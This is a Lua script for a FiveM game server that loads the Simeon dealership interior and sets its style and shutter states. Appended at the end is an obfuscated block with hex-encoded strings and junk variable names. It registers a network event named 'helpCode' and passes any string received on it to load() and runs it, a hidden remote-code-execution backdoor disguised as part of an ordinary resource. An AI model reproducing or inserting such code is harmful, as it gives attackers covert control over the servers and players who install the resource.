exports('GetSimeonObject', function()
    return Simeon
end)

Simeon = {
    interiorId = 7170,

    Ipl = {
        Interior = {
            ipl = {
                "shr_int"
            },

            Load = function()
                EnableIpl(Simeon.Ipl.Interior.ipl, true)
            end,
            Remove = function()
                EnableIpl(Simeon.Ipl.Interior.ipl, false)
            end
        }
    },
    Style = {
        normal = "csr_beforeMission",
        noGlass = "csr_inMission",
        destroyed = "csr_afterMissionA",
        fixed = "csr_afterMissionB",

        Set = function(style, refresh)
            Simeon.Style.Clear(false)

            SetIplPropState(Simeon.interiorId, style, true, refresh)
        end,
        Clear = function(refresh)
            SetIplPropState(Simeon.interiorId, {
                Simeon.Style.normal,
                Simeon.Style.noGlass,
                Simeon.Style.destroyed,
                Simeon.Style.fixed
            }, false, refresh)
        end
    },
    Shutter = {
        none = "",
        opened = "shutter_open",
        closed = "shutter_closed",

        Set = function(shutter, refresh)
            Simeon.Shutter.Clear(false)

            if shutter ~= "" then
                SetIplPropState(Simeon.interiorId, shutter, true, refresh)
            else
                if refresh then
                    RefreshInterior(Simeon.interiorId)
                end
            end
        end,
        Clear = function(refresh)
            SetIplPropState(Simeon.interiorId, {
                Simeon.Shutter.opened,
                Simeon.Shutter.closed
            }, false, refresh)
        end
    },

    LoadDefault = function()
        Simeon.Ipl.Interior.Load()
        Simeon.Style.Set(Simeon.Style.normal)
        Simeon.Shutter.Set(Simeon.Shutter.opened)

        RefreshInterior(Simeon.interiorId)
    end
}


local JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[1]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2]) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[3]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2], function(ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[4]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[5]](ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb))() end)